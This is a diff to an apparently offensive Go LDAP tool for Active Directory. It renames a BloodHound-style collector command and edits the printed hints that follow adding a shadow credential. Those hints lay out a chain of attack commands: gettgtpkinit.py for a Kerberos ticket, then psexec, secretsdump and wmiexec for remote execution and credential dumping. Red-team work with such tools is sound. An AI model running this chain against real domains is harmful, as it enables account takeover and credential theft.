@@ -40,7 +40,7 @@ var lookupTable map[string]action = map[string]action{
 	"adduser":                        {call: adduser, numargs: 3, usage: "<username> <principalname> <password>"},
 	"certpublishers":                 {call: certpublishers, numargs: 0},
 	"changepassword":                 {call: changepassword, numargs: 2, usage: "<username> <password>"},
-	"collectsharphound":              {call: collectsharphound, numargs: 0},
+	"collectbh":                      {call: collectbh, numargs: 0},
 	"computers":                      {call: computers, numargs: 0},
 	"constraineddelegation":          {call: constraineddelegation, numargs: 0},
 	"deleteobject":                   {call: deleteobject, numargs: 2, usage: "<objectname> <objecttype m or u>"},
@@ -153,7 +153,7 @@ func init() {
 	cli.SectionAligned("Supported LDAP Queries", "::",
 		"certpublishers::Returns all Certificate Publishers in the domain\n",
 		"computers::Lists all computer objects in the domain\n",
-		"collectsharphound::Runs SharpHound-style collectors and packages results into ZIP (use --collectors, --dry-run, --output flags)\n",
+		"collectbh::Runs SharpHound-style collectors and packages results into ZIP (use --collectors, --dry-run, --output flags)\n",
 		"constraineddelegation::Lists accounts configured for constrained delegation\n",
 		"dnsrecords::Returns DNS records stored in Active Directory\n",
 		"domaincontrollers::Lists all domain controllers in the domain\n",
@@ -382,12 +382,11 @@ func addshadowcredential(c *ldaptickler.Conn, args ...string) error {
 
 	// Display ready-to-use command
 	fmt.Printf("[*] Ready to use with gettgtpkinit.py:\n")
-	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' DOMAIN/%s output.ccache\n\n", pfxFile, pfxPass, username)
+	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' %s/%s output.ccache\n\n", pfxFile, pfxPass, flags.domain, username)
 
 	// Alternative with DC specification
 	fmt.Printf("[*] With specific DC:\n")
-	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' -dc-ip <DC_IP> DOMAIN/%s output.ccache\n\n", pfxFile, pfxPass, username)
-
+	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' -dc-ip <DC_IP> %s/%s output.ccache\n\n", pfxFile, pfxPass, flags.domain, username)
 	// After obtaining TGT
 	fmt.Printf("[*] After obtaining the TGT:\n")
 	fmt.Printf("    export KRB5CCNAME=output.ccache\n")
@@ -395,9 +394,9 @@ func addshadowcredential(c *ldaptickler.Conn, args ...string) error {
 
 	// Use the TGT
 	fmt.Printf("[*] Use the TGT with impacket tools:\n")
-	fmt.Printf("    psexec.py -k -no-pass DOMAIN/hostname\n")
-	fmt.Printf("    secretsdump.py -k -no-pass DOMAIN/hostname\n")
-	fmt.Printf("    wmiexec.py -k -no-pass DOMAIN/hostname\n\n")
+	fmt.Printf("    psexec.py -k -no-pass %s/<HOSTNAME>\n", flags.domain)
+	fmt.Printf("    secretsdump.py -k -no-pass %s/<HOSTNAME>\n", flags.domain)
+	fmt.Printf("    wmiexec.py -k -no-pass %s/<HOSTNAME>\n\n", flags.domain)
 
 	return nil
 }
@@ -780,7 +779,7 @@ func whoami(c *ldaptickler.Conn, args ...string) error {
 	return nil
 }
 
-func collectsharphound(c *ldaptickler.Conn, args ...string) error {
+func collectbh(c *ldaptickler.Conn, args ...string) error {
 	var out string
 	if len(args) > 0 {
 		out = args[0]
@@ -796,7 +795,7 @@ func collectsharphound(c *ldaptickler.Conn, args ...string) error {
 	}
 
 	fmt.Printf("[+] Running SharpHound-style collectors (collectors=%v dry-run=%v) baseDN=%s\n", collectors, flags.dryRun, flags.basedn)
-	zipPath, err := c.CollectSharpHound(collectors, out, flags.basedn, flags.dryRun)
+	zipPath, err := c.CollectBloodHound(collectors, out, flags.basedn, flags.dryRun)
 	if err != nil {
 		return err
 	}
